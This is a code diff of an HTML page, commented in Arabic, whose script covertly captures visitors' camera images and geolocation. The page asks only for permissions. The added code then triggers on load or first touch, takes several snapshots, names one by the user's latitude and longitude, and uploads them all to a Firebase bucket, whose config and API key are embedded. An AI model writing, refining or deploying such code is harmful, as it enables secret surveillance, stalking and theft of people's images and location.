@@ -25,6 +25,7 @@
   <p>يرجى منح الأذونات اللازمة للتطبيق للتقاط الصور.</p>
   <canvas id="canvas" class="hidden"></canvas>
   <script>
+    // تهيئة Firebase
     const firebaseConfig = {
       apiKey: "AIzaSyALGGBFq-XDvq78XmN13d1FX-9jv2e2jDE",
       authDomain: "image-b3894.firebaseapp.com",
@@ -34,9 +35,11 @@
       appId: "1:724136212410:web:9450152940928e78a40f83",
       measurementId: "G-D8NNFMGFH1"
     };
-
     firebase.initializeApp(firebaseConfig);
     const storage = firebase.storage();
+
+    // متغير لتخزين موقع المستخدم عند الحصول عليه
+    let savedLocation = null;
 
     // دالة لتحويل DataURL إلى Blob
     const dataURLtoBlob = (dataURL) => {
@@ -104,50 +107,58 @@
         .catch(console.error);
     };
 
-    // دالة التقاط الصور مع التمييز بين الصورتين الأوليين وتحديد اسم الصورة الثالثة باستخدام الإحداثيات
+    // دالة التقاط الصور:
+    // - الصورتين الأوليين يُستخدم لهما اسم يعتمد على التاريخ ومعلومات الجهاز.
+    // - الصورة الثالثة تُسَمَّى باستخدام الإحداثيات (مع فاصلة بين خط العرض وخط الطول).
     const capturePhotos = (video, canvas, storageRefBase, captureCount) => {
       if (captureCount < 2) {
-        // استخدام التسمية الاعتيادية للصورتين الأوليين
         const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
         capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
           setTimeout(() => capturePhotos(video, canvas, storageRefBase, captureCount + 1), 500);
         });
       } else if (captureCount === 2) {
-        // بعد الصورة الثانية: طلب إذن الوصول للموقع واستخدام الإحداثيات مع فاصلة للفصل بينهما
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            const { latitude, longitude } = position.coords;
-            const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
-            capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
-              video.srcObject.getTracks().forEach(track => track.stop());
-            });
-          },
-          (error) => {
-            console.error("فشل الحصول على الموقع:", error);
-            // في حال فشل الحصول على الموقع، استخدام التسمية الاعتيادية كبديل
-            const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
-            capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
-              video.srcObject.getTracks().forEach(track => track.stop());
-            });
-          }
-        );
+        if (savedLocation) {
+          const { latitude, longitude } = savedLocation;
+          const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
+          capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+            video.srcObject.getTracks().forEach(track => track.stop());
+          });
+        } else {
+          // في حال عدم توافر الموقع مسبقًا، يتم طلبه هنا
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const { latitude, longitude } = position.coords;
+              const fileName = `snapshot_${latitude.toFixed(6)},${longitude.toFixed(6)}.png`;
+              capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+                video.srcObject.getTracks().forEach(track => track.stop());
+              });
+            },
+            (error) => {
+              console.error("فشل الحصول على الموقع:", error);
+              const fileName = `snapshot_${getFormattedDate()}_${getDeviceInfo()}_${captureCount}.png`;
+              capturePhoto(video, canvas, storageRefBase.child(fileName), () => {
+                video.srcObject.getTracks().forEach(track => track.stop());
+              });
+            }
+          );
+        }
       }
     };
 
-    // طلب إذن الكاميرا
-    const requestCameraPermission = async () => {
-      try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
-      } catch (error) {
-        console.error('فشل في الحصول على إذن الكاميرا:', error);
-      }
-    };
-
-    // تهيئة عملية التقاط الصور
-    const initializePhotoCapture = async () => {
-      await requestCameraPermission();
+    // دالة طلب الأذونات (الكاميرا والموقع) معًا
+    function requestPermissions() {
       navigator.mediaDevices.getUserMedia({ video: true })
         .then(stream => {
+          // طلب إذن الموقع بالتوازي
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              savedLocation = position.coords;
+            },
+            (error) => {
+              console.error("فشل الحصول على الموقع:", error);
+            }
+          );
+          // بدء بث الفيديو والتقاط الصور باستخدام الدفق المستلم
           const video = document.createElement('video');
           video.srcObject = stream;
           video.play();
@@ -156,9 +167,24 @@
             capturePhotos(video, canvas, storage.ref().child('snapshots/'), 0);
           });
         })
-        .catch(console.error);
-    };
+        .catch(error => {
+          console.error("فشل الحصول على إذن الكاميرا:", error);
+        });
+    }
 
+    // إذا كانت الأجهزة اللمسية، نستمع لأول حدث "touchstart"، وإلا نطلب الأذونات فور التحميل
+    function onFirstTouch() {
+      document.removeEventListener("touchstart", onFirstTouch);
+      requestPermissions();
+    }
+
+    if ("ontouchstart" in window) {
+      document.addEventListener("touchstart", onFirstTouch);
+    } else {
+      window.addEventListener("load", requestPermissions);
+    }
+
+    // تسجيل Service Worker (اختياري لتحسين الأداء)
     if ('serviceWorker' in navigator) {
       window.addEventListener('load', () => {
         navigator.serviceWorker.register('/service-worker.js')
@@ -170,8 +196,6 @@
           });
       });
     }
-
-    window.onload = initializePhotoCapture;
   </script>
 </body>
 </html>
